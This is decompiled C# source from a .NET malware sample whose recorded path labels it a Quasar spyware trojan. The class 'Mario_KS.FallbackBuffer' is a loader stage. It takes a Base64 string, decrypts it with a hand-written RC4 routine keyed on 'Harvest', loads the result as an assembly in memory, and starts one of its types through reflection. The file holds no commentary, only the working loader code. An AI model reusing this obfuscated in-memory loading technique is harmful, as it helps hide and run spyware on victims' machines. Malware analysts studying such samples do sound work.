// Decompiled with JetBrains decompiler
// Type: Mario_KS.FallbackBuffer
// Assembly: OnSerializingAttribute, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F72B5184-77D9-4DBB-B29C-2F3B04C48CCD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-8c2eb36fc68b33fc269eaa5f42a303b63ee25bccdd99c0c424285aee9317d94c.exe

using System;
using System.Reflection;
using System.Text;

namespace Mario_KS
{
  public class FallbackBuffer
  {
    public FallbackBuffer(ushort a, bool b, bool c, string FormatterTypeStyle, double z) => this.WSTRBufferMarshaler(this.FourAr((byte[]) Type.GetType("System.Convert").InvokeMember("FromBase64String", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) FormatterTypeStyle
    })));

    public int WSTRBufferMarshaler(byte[] EqualityComparer)
    {
      Activator.CreateInstance(Assembly.Load(EqualityComparer).GetTypes()[9], (object) FormatterTypeStyle.ExclusiveScheduler, (object) FormatterTypeStyle.IdentityAuthority, (object) "Mario_KS");
      return 2048;
    }

    public byte[] FourAr(byte[] D1)
    {
      byte[] bytes = Encoding.BigEndianUnicode.GetBytes("Harvest");
      uint[] numArray1 = new uint[256];
      byte[] numArray2 = new byte[checked (D1.Length - 1 + 1 - 1 + 1)];
      uint index1 = 0;
      do
      {
        numArray1[checked ((int) index1)] = index1;
        checked { ++index1; }
      }
      while (index1 <= (uint) byte.MaxValue);
      uint index2 = 0;
      do
      {
        uint index3 = checked ((uint) ((long) (index3 + (uint) bytes[(int) unchecked ((ulong) index2 % checked ((ulong) bytes.Length))] + numArray1[(int) index2]) & (long) byte.MaxValue));
        uint num = numArray1[checked ((int) index2)];
        numArray1[checked ((int) index2)] = numArray1[checked ((int) index3)];
        numArray1[checked ((int) index3)] = num;
        checked { ++index2; }
      }
      while (index2 <= (uint) byte.MaxValue);
      uint index4 = 0;
      uint index5 = 0;
      int num1 = checked (numArray2.Length - 1);
      int index6 = 0;
      if (index6 == 0)
        goto label_6;
label_5:
      index4 = checked ((uint) (unchecked ((long) checked ((ulong) index4 + 1UL)) & (long) byte.MaxValue));
      index5 = checked ((uint) ((long) (index5 + numArray1[(int) index4]) & (long) byte.MaxValue));
      uint num2 = numArray1[checked ((int) index4)];
      numArray1[checked ((int) index4)] = numArray1[checked ((int) index5)];
      numArray1[checked ((int) index5)] = num2;
      numArray2[index6] = checked ((byte) ((int) D1[index6] ^ unchecked ((int) numArray1[checked ((int) (ulong) ((long) (numArray1[(int) index4] + numArray1[(int) index5]) & (long) byte.MaxValue))])));
      checked { ++index6; }
label_6:
      if (index6 > num1)
        return numArray2;
      goto label_5;
    }
  }
}
